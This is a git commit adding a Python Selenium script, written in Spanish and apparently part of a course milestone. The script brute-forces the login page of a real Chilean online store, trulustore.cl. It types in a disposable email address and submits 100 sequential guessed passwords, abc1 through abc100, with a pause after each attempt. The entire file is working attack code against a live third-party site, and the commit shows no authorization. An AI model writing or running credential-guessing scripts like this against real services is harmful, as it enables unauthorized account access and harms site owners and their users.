dc474f33d20daefd7834f6bb409445591dd40bd8
darkiox <mrdarkiox@gmail.com>
2022-05-11 21:13:54 -0400

    Agregar fuerza bruta CL

---
+++ hito4brutaCL.py
@@ -0,0 +1,22 @@
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.action_chains import ActionChains
+import time, random, string
+driver = webdriver.Chrome()
+correo = "yennettoddemou-1020@yopmail.com"
+#Abrir Trulustore
+driver.get("https://trulustore.cl/mi-cuenta/")
+passw = "abc"
+time.sleep(5) #deshacerse de popup manualmente
+for i in range(100):
+    #Fuerza bruta
+    inputcorreo = driver.find_element(By.ID, "username")
+    inputcorreo.clear()
+    inputcorreo.send_keys(correo)
+    inputpass = driver.find_element(By.ID, "password")
+    inputpass.clear()
+    print("Probando login con: " + passw+str(i+1))
+    inputpass.send_keys(passw+str(i+1))
+    inputpass.send_keys(Keys.ENTER)
+    time.sleep(2)
